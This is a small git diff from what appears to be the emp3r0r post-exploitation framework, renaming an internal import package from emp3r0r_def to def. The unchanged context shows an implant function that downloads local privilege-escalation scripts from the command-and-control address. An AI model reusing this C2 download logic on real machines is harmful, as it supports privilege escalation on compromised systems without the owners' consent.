@@ -9,7 +9,7 @@ import (
 	"os"
 	"strings"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -39,7 +39,7 @@ func CopySelfTo(dest_file string) (err error) {
 
 // runLPEHelper runs helper scripts to give you hints on how to escalate privilege
 func runLPEHelper(method, checksum string) (out string) {
-	log.Printf("Downloading LPE script from %s", emp3r0r_def.CCAddress+method)
+	log.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
 	scriptData, err := SmartDownload("", method, "", checksum)
 	if err != nil {
